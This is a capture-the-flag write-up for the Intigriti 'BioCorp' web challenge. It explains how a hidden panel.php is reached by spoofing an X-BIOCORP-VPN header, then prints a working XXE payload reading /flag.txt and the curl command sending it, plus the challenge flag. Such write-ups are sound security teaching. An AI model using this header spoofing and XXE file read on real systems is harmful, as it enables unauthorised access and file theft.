# Description
BioCorp contacted us with some concerns about the security of their network. Specifically, they want to make sure they've decoupled any dangerous functionality from the public facing website. Could you give it a quick review?

[https://biocorp.ctf.intigriti.io](https://biocorp.ctf.intigriti.io/)


# Flag
INTIGRITI{c4r3ful_w17h_7h053_c0n7r0l5_0r_7h3r3_w1ll_b3_4_m3l7d0wn}

# Analysis 
![image](https://github.com/user-attachments/assets/7e239106-4716-485c-ac1e-ca9b7e42f775)
Upon visiting the site you are greeted with a normal index page. The site features 4 pages that aren't relevant to this challenge as you have the source code of the web app to find the vulnerability within it. 

Inspecting the source code you will find a page that isn't listed on the website which is the panel.php page 
![image](https://github.com/user-attachments/assets/e878d6c0-90e9-4586-80b7-361b43a006e9)

Now you need to understand and analyze the code, I just have gpt summarize it for me but upon first look we can see that there's a check for a header that needs to be passed to gain access to the site in the code:
![image](https://github.com/user-attachments/assets/87a8c45f-830f-4a81-9992-db2f7d0e41d3)

From this code we can tell that you need the header to gain access to the page, so you need to edit the request and add the header with the ip address that has been specified within the code like so:
![image](https://github.com/user-attachments/assets/02b6b91b-aef7-4159-ba00-4b9424c094d2)

Without the header you will be prompted with an access denied page:
![image](https://github.com/user-attachments/assets/e0d0abd1-720e-481e-a526-6d0ab8976000)

Next, within the source code there is a post request that sends xml data to load content from a file document. This is probably the injection point at which you need a xml injection for xxe injection to read the /flag.txt . The code that shows you this is this one:
![image](https://github.com/user-attachments/assets/8ee5ad77-095d-46b5-87bf-fc674a339f6d)

So now that we know where is our injection point we can make our exploit!

# Solution
The payload that will be used following the source code requirements:
```
<?xml version="1.0"?> <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]> <root> <temperature>&xxe;</temperature> <pressure>&xxe;</pressure> <control_rods>&xxe;</control_rods> </root>
```

Save the payload to a file like payload.xml and we will use this curl command to send it to the website:
```
curl -X POST -H "X-BIOCORP-VPN: 80.187.61.102" -H "Content-Type: application/xml" -d @payload.xml https://biocorp.ctf.intigriti.io/panel.php
```

After sending the payload the temperature, pressure and control rod values will change to the flag like so:
![image](https://github.com/user-attachments/assets/709eedac-be85-4f74-96ff-39eabebf5c6e)


**IMPORTANT: Do not forget to add the "X-BIOCORP-VPN:" header still otherwise you will get the access denied page!**

#L337upCTF2024
